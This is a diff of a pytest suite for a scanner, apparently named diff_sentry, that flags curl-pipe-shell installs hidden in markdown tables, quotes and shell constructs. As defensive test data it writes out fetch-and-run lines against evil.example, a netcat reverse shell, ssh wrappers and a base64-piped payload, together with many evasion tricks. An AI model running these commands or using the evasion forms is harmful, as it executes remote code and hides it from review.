@@ -3267,9 +3267,9 @@ def test_one_match_to_the_scan_and_another_to_the_softening_is_not_softened_beca
         assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", text
 
 
-@pytest.mark.parametrize("name_cell", ["`uv`", "`uv` (Python)", "**`uv`**", "[`uv`](https://docs.astral.sh/uv/)", "`macOS` / `Linux`", "$HOME", '"uv"', "A &amp; B"])
+@pytest.mark.parametrize("name_cell", ["`uv`", "`uv` (Python)", "**`uv`**", "[`uv`](https://docs.astral.sh/uv/)", "`macOS` / `Linux`", "$HOME", "A &amp; B"])
 @pytest.mark.parametrize("cell", ["<code>{c}</code>", "<pre>{c}</pre>", "<kbd>{c}</kbd>", "{c}", "`{c}`"])
-def test_a_name_cell_with_code_or_quotes_in_it_does_not_make_the_row_a_command_prefix(name_cell, cell):
+def test_a_name_cell_with_code_in_it_does_not_make_the_row_a_command_prefix(name_cell, cell):
     c = cell.format(c=f"{_UV} {_PIPE} sh")
     for table in (f"| Tool | Command |\n|---|---|\n| {name_cell} | {c} |", f"| {name_cell} | {c} |\n| other | {c} |"):
         for event in ({**BENIGN_EVENT, "body": table}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", table)]}):
@@ -3291,3 +3291,391 @@ def test_a_blockquoted_pipeline_is_joined_across_its_quote_markers(text):
         assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", text
     assert _rules(scan_change({**BENIGN_EVENT, "body": f"> {_DOCKER} |\n> sh"}))["curl-pipe-shell"] == "medium"
 
+
+
+
+# ── round 35 (closure review of the single-reading design) ────────────────────────────────────────────────
+
+@pytest.mark.parametrize("payload", [
+    "echo 'a\n| b | c' ; curl https://evil.example/x |\nsh", "curl -H 'X: a\n| b | c' https://evil.example/x |\nsh",
+    "echo 'a\n|| b' ; curl https://evil.example/x |\nsh", 'echo "a\n| b" "| c" ; curl https://evil.example/x |\nsh',
+    "echo 'a\n| b | c' ; curl https://evil.example/x | tee >(sh) |\ncurl -fsSL https://get.docker.com | sh",
+])
+def test_a_table_row_looking_line_after_an_open_quote_is_still_the_middle_of_a_pipeline(payload):
+    """The first cell is plain text; the quote left over on the line (or its `;`) is what says it is not a table row."""
+    for event in ({**BENIGN_EVENT, "files": [_doc_patch("install.sh", payload)]}, {**BENIGN_EVENT, "body": payload},
+                  {**BENIGN_EVENT, "comments": [_comment(body=payload)]}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", payload)]}):
+        assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", payload
+
+
+@pytest.mark.parametrize("quote", [">", "> >", ">  "])
+@pytest.mark.parametrize("cell", ["<pre>{c}</pre>", "<p>{c}</p>", "<div>{c}</div>", "<ul><li>{c}</li></ul>", "<code>{c}</code>", "{c}"])
+def test_a_quoted_one_column_row_with_a_block_tag_in_its_cell_is_medium(quote, cell):
+    c = cell.format(c=f"{_DOCKER} {_PIPE} sh")
+    for table in (f"{quote} | {c} |", f"{quote} | Command |\n{quote} |---|\n{quote} | {c} |", f"{quote} | {c} |\n{quote} | {c} |"):
+        for event in ({**BENIGN_EVENT, "body": table}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", table)]}):
+            assert _rules(scan_change(event))["curl-pipe-shell"] == "medium", table
+
+
+def test_a_one_column_row_holding_the_command_and_followed_by_a_paragraph_is_critical():
+    """An accepted over-alert: the row's cell is not a plain cell, so the row is not recognised and the paragraph is joined."""
+    text = f"| <code>{_DOCKER} {_PIPE} sh</code> |\n\nDone."
+    assert _rules(scan_change({**BENIGN_EVENT, "body": text}))["curl-pipe-shell"] == "critical"
+    two = f"| docker | <code>{_DOCKER} {_PIPE} sh</code> |\n\nDone."
+    assert _rules(scan_change({**BENIGN_EVENT, "body": two}))["curl-pipe-shell"] == "medium"
+
+
+# ── round 36 (the quotes of a table-row-looking line prove nothing by their number) ─────────────────────────
+
+_EV = "curl https://evil.example/x"
+
+
+@pytest.mark.parametrize("payload", [
+    'echo "a\n| b | \\"x" ; ' + _EV + " |\nsh", "echo 'a\n| b | c'\\''d' ; " + _EV + " |\nsh", "echo 'a\n| b | foo'bar ; " + _EV + " |\nsh",
+    "echo 'a\n| b | c' x'y' ; " + _EV + " |\nsh", 'curl -H "X: a\n| b | 5\\" y" https://evil.example/x |\nsh',
+    'git commit -m "a\n| b | \\"q" ; ' + _EV + " |\nsh", "echo 'a\n| b | c'\"'\"'d' ; " + _EV + " |\nsh",
+    "echo $'a\n| b | it\\'s' ; " + _EV + " |\nsh",
+])
+def test_a_line_that_closes_a_string_opened_above_is_never_a_table_row_however_its_quotes_are_written(payload):
+    """The count of quotes on the line says nothing (an escaped `\\"`, the `'\\''` idiom, a closing quote glued to a letter): the
+    line holds a quote character, and that is what a row does not have."""
+    for event in ({**BENIGN_EVENT, "files": [_doc_patch("install.sh", payload)]}, {**BENIGN_EVENT, "body": payload},
+                  {**BENIGN_EVENT, "comments": [_comment(body=payload)]}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", payload)]}):
+        assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", payload
+
+
+@pytest.mark.parametrize("opener", ['echo "a\n| b | \\"x" ; ', "echo 'a\n| b | c'\\''d' ; ", "echo 'a\n| b | foo'bar ; ", "echo 'a\n| b | c' x'y' ; "])
+@pytest.mark.parametrize("stage", ["evil", "nc evil.example 4444 -e sh", "docker run x"])
+def test_a_stage_in_front_of_an_installer_after_such_a_line_is_not_hidden_either(opener, stage):
+    text = f"{opener}{stage} |\n{_DOCKER} | sh"
+    for event in ({**BENIGN_EVENT, "body": text}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", text)]}):
+        assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", text
+
+
+@pytest.mark.parametrize("first_cell", ["Don't", "it's", '"uv"', 'A "quoted" word'])
+def test_a_quote_in_a_cell_in_front_of_the_command_is_not_plain_text(first_cell):
+    """A quote is shell syntax (`echo "a⏎| " ; "evil" | curl … | sh` runs `evil`), so such a cell is not plain and the row stays a
+    command (an accepted over-alert), whatever follows it."""
+    table = f"| {first_cell} | <code>{_UV} {_PIPE} sh</code> |\n| other | ok |"
+    assert _rules(scan_change({**BENIGN_EVENT, "body": table}))["curl-pipe-shell"] == "critical"
+
+
+# ── round 37/38 (a line that starts with a pipe is a row only when no shell around it could read it as more than text) ──
+# every payload has a plain first cell AND a second cell, so the first-cell regex accepts it and only `_reads_as_shell` stops it
+
+_DEEP = [  # (payload, the guard that stops it)
+    ("[ $((0\n| 0 | 0)) -ne 0 ] || " + _EV + " |\nsh", ")"), ("((0\n| 0 | 0)) || " + _EV + " |\nsh", ")"),
+    ("flags=$((A\n| B | C)) " + _EV + " |\nsh", ")"), ("x=$((1\n| 2 | 3)) \\(\\( ; " + _EV + " |\nsh", ")"),
+    ("x=${Q:-a\n| b | c} ; " + _EV + " |\nsh", "}"), ("x=${Q:-a\n| { | } ; " + _EV + " |\nsh", "{ is literal in ${}"),
+    ("x=$[1\n| 2 | 3] ; " + _EV + " |\nsh", "]"),
+    ("echo `echo a\n| b | c` ; " + _EV + " |\nsh", "odd backticks"),
+    ("echo 'a\n| b | \\' ; " + _EV + " |\nsh", "backslash-quote"), ("curl -H 'X: a\n| b | \\' https://evil.example/x |\nsh", "backslash-quote"),
+    ('echo "x\n| a | $(' + _EV + " |\nsh)\"", "$("), ("cat <<EOF\n| a | $(" + _EV + " |\nsh)\nEOF", "$("),
+    ("x=${Q:-a\n| b | <(" + _EV + " |\nsh)}", "<("), ("x=${Q:-a\n| b | >(" + _EV + " |\nsh)}", ">("), ("cat <<EOF\n| a | `" + _EV + " |\nsh`", "odd backticks"),
+    ("x=${Q:-a\n| b | \\${ } ; " + _EV + " |\nsh", "escaped dollar brace"), ("x=${Q:-a\n| b | $${ } ; " + _EV + " |\nsh", "doubled dollar brace"),
+    ("x=${Q:-a\n| a | `${` } ; " + _EV + " |\nsh", "brackets inside a backtick pair"),
+    ("x=$((1\n| a | `((` )) ; " + _EV + " |\nsh", "brackets inside a backtick pair"),
+    ("x=$((1\n| |${$((})) | x ; " + _EV + " |\nsh", "brackets must nest"),
+    ("x=${Q:-a\n| b | $\\${ } ; " + _EV + " |\nsh", "dollar then escaped dollar brace"),
+    ("x=${Q:-a\n| $ | { | } ; " + _EV + " |\nsh", "a dollar does not reach across a pipe"),
+    ("x=${Q:-a\n| b | (c } ; " + _EV + " |\nsh", "a brace does not close a paren"), ("x=${Q:-a\n| b | [c } ; " + _EV + " |\nsh", "a brace does not close a bracket"),
+    # a `#` after a pipe on a pipe-led line is text of the construct above, not a comment that ends the line
+    ("echo 'a\n| b ) | # c' ; " + _EV + " | sh\n", "a closer in front of the hash"), ("echo 'a\n| b ] | # c' ; " + _EV + " | sh\n", "a bracket closer in front of the hash"),
+    ('echo "a\n | b <( | # c" ; ' + _EV + " | sh", "an opener in front of a hash whose text holds the payload"),
+    # a stage cell between the download and the swallowed pipe; a plus that is not the one leading character; a closer right after an escape
+    ("x=$((1\n| 2 )) " + _EV + " | cat | # c\nsh", "a stage between the download and the swallowed pipe"),
+    ("echo 'a\n +| b ) | # c' ; " + _EV + " | sh\n", "blank, plus"), ("echo 'a\n+ +| b ) | # c' ; " + _EV + " | sh\n", "plus, blank, plus"),
+    ("echo 'a\n++| b ) | # c' ; " + _EV + " | sh\n", "two pluses"),
+    ("x=${Q:-a\n| b | \\x} ; " + _EV + " |\nsh", "a closer right after an escaped character"),
+    ('echo "x\n| a | $( ( ' + _EV + ' |\nsh) )"', "two open substitutions"), ('echo "x\n| a | $( ( ( ' + _EV + ' |\nsh) ) )"', "three open substitutions"),
+    ("x=$((1\n| 2 )) true | # c\nx=$((1\n| 2 )) " + _EV + " | # e\nsh\n", "two swallow rows, the second holds the download"),
+    ("curl -H 'X: a\n| b | c' " + _EV[5:] + " |\n# c\nsh", "a quote in a later cell, the download in front"),
+    # the joined line is not inserted between the swallowed line and the next: a `$(` ending the line still meets the `curl` below it
+    ("echo 'x\n| b ) | # c' ; sh -c \"$(\n" + _EV + ')"\n', "a substitution split across the swallow"),
+    ("echo 'x\n| b ) | # c' ; bash <(\n" + _EV + ")\n", "a process substitution split across the swallow"),
+    ("echo 'x\n| b ) | # c' ; eval \"$(\n" + _EV + ')"\n', "an eval substitution split across the swallow"),
+    ("echo 'x\n| b ) | " + " ".join(f"w{i}" for i in range(1000)) + " | # c' ; " + _EV + " -H 'a\nb' | sh\n", "a long row in front of a quoted argument"),
+    # a492ab2 caught these and the CR/form-feed handling must not hide them: the raw form feed is an ordinary character
+    ("\x0c| a | " + _EV + " |\n# c\nsh", "a raw form feed in front of a pipe-led line"), ("\x0c| a | " + _EV + " | # c\nsh", "a raw form feed, hash"),
+    ("echo 'a\r|#c' ; " + _EV + " | sh\n", "CR, glued hash"), ("echo 'a\nb |#c' ; " + _EV + " | sh\n\r| x", "a pipe-led line after a CR"),
+    # the comment line after the live pipe of a line that closes a construct: join it too
+    ("x=$((1\n| b | c )) ; " + _EV + " |\n# c\nsh", "a comment line after the pipe of a closer row"),
+    ("x=${Q:-a\n| b | c } ; " + _EV + " |\n# c\nsh", "a comment line after the pipe of a brace row"),
+    ("x=$[1\n| 2 | 3] ; " + _EV + " |\n  # c\nsh", "an indented comment line after the pipe of a bracket row"),
+    ("echo 'a\n+| b | # c' ; " + _EV + " | sh\n", "plus, hash"), ("echo 'a\n| b ) | c |\n# d' ; " + _EV + " | sh\n", "a comment line after the pipe"),
+    ("echo 'a\n| b' ; " + _EV + " |\n# c\nsh", "a comment line between the pipe and its sink"),
+    # what a492ab2 caught and a `#` must not hide: a continued line, `>|`, a CR or a `+` that makes the line an ordinary pipeline
+    ("echo a \\\n| " + _EV + " | # c\nsh", "a continued line with a comment"), (">|/tmp/o : ; " + _EV + " | # c\nsh", "a clobber redirect"),
+    (">|f evil | " + _EV + " | # c\nsh", "a clobber redirect with a plain first cell"),
+    ("echo 'a\n| b | c' ; " + _EV + " |\n#" + "x" * 100 + "\n#" + "y" * 100 + "\n#" + "z" * 100 + "\nsh", "a quote in a later cell, long comment lines"),
+    ("echo hi\r|b; " + _EV + " | # c\nsh\n", "CR in front of a pipeline with a comment"), ("+|b; " + _EV + " |# c\nsh", "plus in front of a pipeline"),
+    ("echo 'a\n| b' ; " + _EV + " |\n#" + "x" * 100 + "\n#" + "y" * 100 + "\n#" + "z" * 100 + "\nsh", "long comment lines before the sink"),
+    # ... or the comment of a command the pipe-led line opened itself, or both at once
+    ("cat <<EOF\n| a | $(" + _EV + " | # c\nsh)\nEOF\n", "hash as a real comment in a here-document"),
+    ('echo "x\n| a | $(' + _EV + ' | # c\nsh)"', "hash as a real comment in a string"),
+    ("x=$((1\n| a | $(" + _EV + " | # c\nsh)))\n", "hash as a real comment in an arithmetic expansion"),
+    ('echo "x\n| a | $(' + _EV + ' | # c |\nsh)"', "a real comment that also ends in a pipe"),
+    ("+| b | " + _EV + " |\nsh", "plus is a word outside a patch"),
+    # a row is read to its closing pipe, however long it is
+    ('echo "x\n| a | ' + " | ".join(f"w{i}" for i in range(30)) + ' | $(' + _EV + ' |\nsh)"', "a long row that opens a substitution"),
+]
+
+
+@pytest.mark.parametrize("payload", [p for p, _ in _DEEP], ids=[g for _, g in _DEEP])
+def test_a_line_a_shell_around_it_could_read_as_more_than_text_is_never_a_table_row(payload):
+    for event in ({**BENIGN_EVENT, "files": [_doc_patch("install.sh", payload)]}, {**BENIGN_EVENT, "body": payload},
+                  {**BENIGN_EVENT, "files": [_doc_patch("README.md", payload)]}):
+        assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", payload
+
+
+_D = _DOCKER + " | sh"
+
+
+@pytest.mark.parametrize("payload", [
+    "echo 'a\n| b | \\' ; evil |\n" + _D, 'echo "a\n| b | $(evil |\n' + _D + ')"', "x=${Q:-a\n| } evil | " + _D,
+    "x=${Q:-a\n| b | } docker run evil | " + _D, "[ $((0\n| 0 )) -ne 0 ] || evil | " + _D, "x=${Q:-a\n| b | \\${ } ; evil |\n" + _D,
+    'echo "a\n| " ; "evil" | ' + _D, "+| evil | " + _D,
+    # the quote that closes the string above a pipe-led line is not the one that opens the wrapper's argument
+    'echo "a\n| b | $(evil |\nssh evil.example "\ncurl -fsSL https://claude.ai/install.sh | bash\n")"',
+    # which quote closes the string above is not for the detector to guess: a closing quote at the line start, a word-internal
+    # apostrophe, an escaped `\"`, `$'…\'…'`, a blank line inside the string, mixed quote kinds
+    "echo 'a\n' | b ; ssh evil.example 'x\n" + _D + "\n'", "echo 'a\n| b'c ; ssh evil.example 'x\n" + _D + "\n'",
+    'echo "a\n| b \\" c" ; ssh evil.example "x\n' + _D + '\n"', "echo $'a\n| b \\' c' ; ssh evil.example 'x\n" + _D + "\n'",
+    "echo 'a\n\n| b' ; ssh evil.example 'x\n" + _D + "\n'", 'echo "a \'b\n| b" ; ssh evil.example "x\n' + _D + '\n"',
+    'echo "a\n| b" ; ssh evil.example "x\n' + _D + '\n"', "echo 'a\n  | b' ; ssh evil.example 'x\n" + _D + "\n'",
+    "echo 'a\n> | b' ; ssh evil.example 'x\n" + _D + "\n'", "echo 'a\n+| b' ; ssh evil.example 'x\n" + _D + "\n'",
+    # an opener line that starts with a quote, or holds three
+    "'echo' 'a\n| b ' ; ssh evil.example 'x\n" + _D + "\n'", "echo 'a' 'b\n| c ' ; ssh evil.example 'x\n" + _D + "\n'",
+    "ssh evil.example 'a' 'b\n" + _D + "\n'",
+    # the guards read the line as it was, not as `_fold_padding` leaves it (a repeated token is kept once there)
+    "echo $(( 1\n| (( 3 )) )) | evil | " + _D, "echo 'a 'a 'x\n| b ' ; ssh evil.example 'y\n" + _D + "\n'", " + | b | evil | " + _D,
+    # a continued line: the `echo a \` in front is what keeps `| evil |` from being read as the cells of a row
+    "echo a \\\n| evil | " + _DOCKER + " | # c\nsh",
+    "+| b | evil |\n" + _D,
+    "+| evil | cu<b></b>rl -LsSf https://astral.sh/uv/install.sh | sh",
+    # ... and the lines keep their count, so the sixty-line window of `enclosed` does not move
+    "ssh evil.example 'x\n| b ) | # c\n" + "x\n" * 58 + _D + "\n'\n",
+    "echo 'a\n" + "f\n" * 55 + "| b' ; ssh evil.example 'x\n" + _D + "\n'",
+    "echo 'a\nfoo \"b\n| b' ; ssh evil.example 'x\n" + _D + "\n'",
+    "echo 'a\n| b | c' ; evil | ssh evil.example '\nwget -qO- https://install.python-poetry.org | sh\n'",
+    # the cells a prefix drop removes are the folded ones: a first cell of more than eighty characters as written (a hundred
+    # blanks, `+1` forty times, six pipes in a row) is shorter once folded, and the stray closer in it is still a closer
+    "echo $((1\n| a" + " " * 100 + "+1 )) | evil | " + _D, "echo $((1\n| a" + " +1" * 40 + " )) | evil | " + _D,
+    "echo $((1\n" + " " * 100 + "| a +1 )) | evil | " + _D, "x=${Q:-a\n|" + " " * 100 + "} evil | " + _D,
+    "x=${Q:-a\n| | | | | | | } evil | " + _D, "[ $((0\n|" + " " * 100 + "0 )) -ne 0 ] || evil | " + _D,
+    "echo $(( 1\n|" + " " * 100 + "(( 3 )) )) | evil | " + _D,
+    # an escaped pipe is a word of the download (`curl` fetches the URL `|` as well), not a pipe the fold may merge with the next
+    _DOCKER + " \\| | sh", "Run `" + _DOCKER + " \\| | sh` now.", _DOCKER + " \\| \\| | sh",
+    # six cells: the first four raw cells hold no closer and the fold merges the `a`s, but the closers are in the cells that are dropped
+    "x=$[1\n| [ | a | a | a | a | ] ] | evil | " + _D, "x=$((1\n| ( | a | a | a | a | a | ) ) ) | evil | " + _D,
+    # a line that begins with a cell's pipe `\|` is pipe-led too
+    "echo 'a\n\\| b' ; ssh evil.example 'x\n" + _D + "\n'", "echo 'a\n  \\| b' ; ssh evil.example 'x\n" + _D + "\n'",
+    "echo 'a\n> \\| b' ; ssh evil.example 'x\n" + _D + "\n'", "echo 'a\n+\\| b' ; ssh evil.example 'x\n" + _D + "\n'",
+    # the sixty-line window of `enclosed`, to its last line
+    "echo 'a\n" + "f\n" * 59 + "| b' ; ssh evil.example 'x\n" + _D + "\n'",
+    "echo 'a\n| b | \\' ; evil |\ndocker run x sh -c '\nset -e\ncurl -fsSL https://raw.githubusercontent.com/nvm-sh/nvm/v0.40.1/install.sh | sh\n'",
+])
+def test_a_row_looking_line_in_front_of_a_documented_installer_does_not_soften_what_runs_in_front_of_it(payload):
+    for event in ({**BENIGN_EVENT, "body": payload}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", payload)]}):
+        assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", payload
+
+
+@pytest.mark.parametrize("cell", ["(macOS)", "[docs](https://x.y/z)", "`code`", "[1]", "(a (b))", "`a` and `b`"])
+def test_balanced_brackets_and_code_spans_in_the_first_cell_do_not_stop_a_row_being_a_row(cell):
+    row = f"| {cell} | <code>{_DOCKER} {_PIPE} sh</code> |"
+    assert _rules(scan_change({**BENIGN_EVENT, "body": f"{row}\n\nDone."}))["curl-pipe-shell"] == "medium", row
+
+
+@pytest.mark.parametrize("cell", ["{x}", "a}", "{owner}/{repo}"])
+def test_a_brace_that_no_dollar_brace_opened_is_a_closer_and_the_row_stays_critical_before_a_paragraph(cell):
+    """Accepted over-alert: in a shell the `}` could close a `${` opened above (a `{` is a literal inside one)."""
+    row = f"| {cell} | <code>{_DOCKER} {_PIPE} sh</code> |"
+    assert _rules(scan_change({**BENIGN_EVENT, "body": f"{row}\n\nDone."}))["curl-pipe-shell"] == "critical", row
+
+
+@pytest.mark.parametrize("tail", ["2)) ", "b} ", "x] ", "`a ", "{ | } ", "a \\' b", 'a \\" b', "a $(x", "a <(x", "a >(x", "\\${ } ",
+                                  "$${ } ", "`${` } ", "`((` )) ", "${$((})) ", "(a] ", "[a) "])
+def test_a_line_that_closes_opens_or_reads_as_shell_is_not_a_row(tail):
+    from diff_sentry.indicators import _reads_as_shell
+    assert _reads_as_shell(f"| {tail}")
+
+
+@pytest.mark.parametrize("tail", ["a \\) b", "\\( x", "(a) [b] ${c}", "`a` `b`", "\\` x", "(macOS) | `curl X \\| sh`", "$HOME | `a` b", "a & b &amp; c",
+                                  "bash <(curl -fsSL https://get.docker.com) ", "$(x) y", "a >(b) | c", "$((1 + 2)) ", "${x} (a [b] (c))",
+                                  "`a (b` c", "a `${` b", "a $$(x "])
+def test_an_escaped_closer_balanced_brackets_and_code_spans_read_as_text(tail):
+    from diff_sentry.indicators import _reads_as_shell
+    assert not _reads_as_shell(f"| {tail}")
+
+
+@pytest.mark.parametrize("cell", ["stable", "(macOS)", "[docs](https://x.y)"])
+@pytest.mark.parametrize("wrap,severity", [("<code>{c}</code>", "critical"), ("<pre>{c}</pre>", "critical"), ("{c}", "critical"),
+                                           ("`{c}`", "medium")])
+def test_a_cell_after_the_command_is_a_stage_of_its_pipeline_unless_the_command_is_a_backtick_span(wrap, severity, cell):
+    row = f"| docker | {wrap.format(c=f'{_DOCKER} {_PIPE} sh')} | {cell} |"
+    assert _rules(scan_change({**BENIGN_EVENT, "body": row}))["curl-pipe-shell"] == severity, row
+
+
+def test_a_pipe_led_row_without_a_quote_does_not_make_the_installer_below_it_enclosed():
+    """Add-only guard: the line above leaves an odd quote ("the 'quoted"), the row holds a wrapper but no quote, so nothing on it can
+    close a string or open a wrapper's argument and the documented installer on the next line stays medium."""
+    body = f"the 'quoted word\n| docker | docker run x sh -c ls |\n{_DOCKER} | sh"
+    assert _rules(scan_change({**BENIGN_EVENT, "body": body}))["curl-pipe-shell"] == "medium"
+
+
+def test_the_scan_of_a_decoded_payload_reads_a_leading_plus_as_a_word():
+    import base64
+    inner = "+| b | " + _EV + " |\nsh"
+    text = "echo " + base64.b64encode(inner.encode()).decode() + " | base64 -d | sh"
+    assert _rules(scan_change({**BENIGN_EVENT, "body": text}))["obfuscated-payload"] == "critical"
+
+
+def test_the_rendered_view_of_a_body_reads_a_leading_plus_as_a_word_too():
+    body = "+| b | cu<b></b>rl " + _EV.split(" ", 1)[1] + " |\nsh"
+    assert _rules(scan_change({**BENIGN_EVENT, "body": body}))["curl-pipe-shell"] == "critical"
+
+
+def test_a_table_header_with_a_hash_cell_is_still_a_row():
+    table = f"| # | Tool | Command |\n|---|---|---|\n| 1 | docker | <code>{_DOCKER} {_PIPE} sh</code> |\n\nDone."
+    assert _rules(scan_change({**BENIGN_EVENT, "body": table}))["curl-pipe-shell"] == "medium"
+    assert _rules(scan_change({**BENIGN_EVENT, "body": f"| # | Command |\n| 1 | <code>{_DOCKER} {_PIPE} sh</code> |\n\nDone."}))["curl-pipe-shell"] == "medium"
+
+
+@pytest.mark.parametrize("text", [
+    # a492ab2 counted the quotes of the FOLDED line, where `'b 'b` is `'b`: an even pair looks open and the installer on its own line is
+    # called critical, an accepted over-alert kept so that the cases below stay what they were
+    "ssh evil.example 'a' 'b 'b\n" + _D + "\n'", "echo 'a\n' | b ; ssh evil.example 'x 'x\n" + _D + "\n'",
+    # where the count of quotes is wrong about what a shell does (`\'`, `'\''`, `$'…'`, an apostrophe inside a word, a quote of one kind
+    # inside the other) the collapse of `'z 'z` makes it right by accident, and the installer is in the wrapper's argument
+    "ssh evil.example 'a'\\''b 'z 'z\n" + _D + "\n'", "ssh -t h it's 'z 'z\n" + _D + "\n'", "docker run x sh -c 'a'\\''b 'z 'z\n" + _D + "\n'",
+    "ssh evil.example $'a\\'b 'z 'z\n" + _D + "\n'", 'ssh evil.example "a\\"b "z "z\n' + _D + '\n"',
+])
+def test_a_fold_that_collapses_a_quote_never_makes_a_wrapper_line_look_closed(text):
+    for event in ({**BENIGN_EVENT, "body": text}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", text)]}):
+        assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", text
+
+
+@pytest.mark.parametrize("pad", [" " * 400, "\t" * 400, "A" * 3000, " a" * 200, " -s" * 200], ids=["blanks", "tabs", "token", "words", "flags"])
+@pytest.mark.parametrize("wrapper", ["ssh evil.example 'x", "docker run x sh -c 'x", "ssh evil.example '"])
+def test_a_wrapper_line_the_fold_shortens_still_encloses_the_installer_below_it(wrapper, pad):
+    """The quote that opens the wrapper's argument counts wherever it stands on the line as written: a blank run, a long token or
+    a repeated word after it makes the line shorter once folded, but the installer on the next line is still inside the argument
+    (`ssh` is called with it, nothing downloads on this machine)."""
+    text = f"{wrapper}{pad}\n{_D}\n'"
+    for event in ({**BENIGN_EVENT, "body": text}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", text)]}):
+        assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", text[:60]
+
+
+@pytest.mark.parametrize("count", [26, 40], ids=["342 characters", "480 characters"])
+@pytest.mark.parametrize("wrapper", ["ssh evil.example 'y", "docker run x sh -c 'y"])
+def test_a_quote_that_is_no_shell_quote_earlier_on_a_long_line_does_not_pair_with_the_wrappers(wrapper, count):
+    """The apostrophe of `"5' tall"` is text, so the wrapper's quote after it, more than 300 characters on, is still the one that opens its
+    argument: the last 300 characters of the line are counted, not the whole line."""
+    text = "echo \"5' tall\" ; " + "".join(f"echo w{i:03d} ; " for i in range(count)) + f"{wrapper}\n{_D}\n'"
+    for event in ({**BENIGN_EVENT, "body": text}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", text)]}):
+        assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", text[-80:]
+
+
+def test_the_fold_with_origin_is_the_fold_and_every_character_comes_from_a_place_in_the_text():
+    """`_soften_prose` reads the text a dropped cell was folded from through the origins; a fold that differed from `_fold_padding`, or an
+    origin that went back, would read the wrong text."""
+    import random
+
+    from diff_sentry.indicators import _fold_padding, _fold_with_origin
+    rng = random.Random(7)
+    atoms = [" ", "  ", "\t", "|", "| ", "\\|", "a", "b", "curl", "sh", "'", '"', "`", "$(", ")", "))", "]", "}", "x" * 130, "/" * 5,
+             "../../../", "+", "-s", "-s -s -s", "( ( (", ") ) )", "| | |", "http://a.b/c", "a" * 70]
+    for _ in range(4000):
+        text = "".join(rng.choice(atoms) for _ in range(rng.randint(1, 30)))
+        folded, origin = _fold_with_origin(text)
+        assert folded == _fold_padding(text).replace("\\|", "|"), text
+        places = [o if o >= 0 else -1 - o for o in origin]          # a character the fold made up is `-1 - the place it began at`
+        assert len(origin) == len(folded) and all(0 <= o < len(text) for o in places) and places == sorted(places), text
+
+
+@pytest.mark.parametrize("text", [
+    # the fold turns `'x 'x` into `'x`, so the quotes of the folded line are even; as written they are three, and the installer is in the
+    # argument (which a492ab2 missed)
+    "ssh evil.example 'x 'x 'y\n" + _D + "\n'", "ssh evil.example 'x 'x 'y " + " ".join(f"w{i:03d}" for i in range(25)) + "\n" + _D + "\n'",
+    # the wrapper and its quote are 250 characters from the end of the line, inside the 300 that are counted
+    "ssh evil.example 'x " + " ".join(f"w{i:03d}" for i in range(50)) + "\n" + _D + "\n'",
+    # ... and exactly 300 characters from it: cut one off and `docker run` is no wrapper (`ocker run`)
+    "ssh evil.example 'x " + "".join(f"w{i:03d} " for i in range(56)) + "\n" + _D + "\n'",
+    "docker run x 'x " + "".join(f"w{i:03d} " for i in range(56)) + "abcd\n" + _D + "\n'",
+    # the last 300 characters of the folded line begin on a blank that the fold made up out of five (the text they were folded from
+    # begins there too)
+    "echo a ;" + " " * 5 + "docker run x 'x 'x 'y " + "".join(f"w{i:03d} " for i in range(56)) + "\n" + _D + "\n'",
+    # a pad after the collapsed quote pushes the quotes out of the last 300 characters as written: the text the folded tail came from counts
+    "ssh evil.example 'x 'x 'y" + " " * 400 + "z\n" + _D + "\n'", "ssh evil.example 'x 'x 'y" + "\t" * 400 + "z\n" + _D + "\n'",
+    "docker run x sh -c 'x 'x 'y" + " a" * 200 + "\n" + _D + "\n'",
+])
+def test_the_quotes_of_the_line_as_written_count_when_the_fold_collapses_a_repeated_one(text):
+    for event in ({**BENIGN_EVENT, "body": text}, {**BENIGN_EVENT, "files": [_doc_patch("README.md", text)]}):
+        assert _rules(scan_change(event))["curl-pipe-shell"] == "critical", text[:60]
+
+
+@pytest.mark.parametrize("text", [
+    "x=${Q:-a\n|" + "a" * 70 + "|" + "a" * 70 + "|}|evil| " + _D, "x=${Q:-a\n|" + "a" * 70 + "|" + "a" * 70 + "|}|evil|" + _D,
+    "x=${Q:-a\n| b | " + "a" * 70 + "|" + "a" * 70 + "|}|evil|" + _D])
+def test_a_dropped_cell_that_the_fold_made_up_is_not_dropped(text):
+    """Cells glued into a word of more than 120 characters are folded into a made-up word: what they were cannot be read back, so nothing
+    is dropped in front of the command (the `}` closes the `${` above, and `evil` and the installer run)."""
+    assert _rules(scan_change({**BENIGN_EVENT, "body": text}))["curl-pipe-shell"] == "critical", text
+
+
+def test_a_row_is_not_dropped_when_its_fold_cannot_be_traced_back_to_the_line(monkeypatch):
+    """A fold that differs from `_fold_padding` (a change to one and not to the other) means the text a cell came from is unknown: the
+    cells in front of the installer are kept, and the row is read as the shell tail it might be."""
+    row = f"| docker | <code>{_DOCKER} {_PIPE} sh</code> |"
+    assert _rules(scan_change({**BENIGN_EVENT, "body": row}))["curl-pipe-shell"] == "medium"
+    from diff_sentry import indicators
+    real = indicators._fold_with_origin
+
+    def drifting(text):
+        folded, origin = real(text)
+        return folded + "x", [*origin, len(text) - 1]
+    monkeypatch.setattr(indicators, "_fold_with_origin", drifting)
+    assert _rules(scan_change({**BENIGN_EVENT, "body": row}))["curl-pipe-shell"] == "critical"
+
+
+@pytest.mark.parametrize("pad", [" " * 100, " " * 400])
+def test_a_padded_first_cell_of_a_row_is_still_a_cell(pad):
+    """Aligned tables pad a cell to the widest one of its column: the cells are read as folded and as written, and a padded cell that
+    holds only text drops like any other."""
+    row = f"| docker{pad}| `{_DOCKER} \\| sh` |"
+    assert _rules(scan_change({**BENIGN_EVENT, "body": f"{row}\n\nDone."}))["curl-pipe-shell"] == "medium", row
+
+
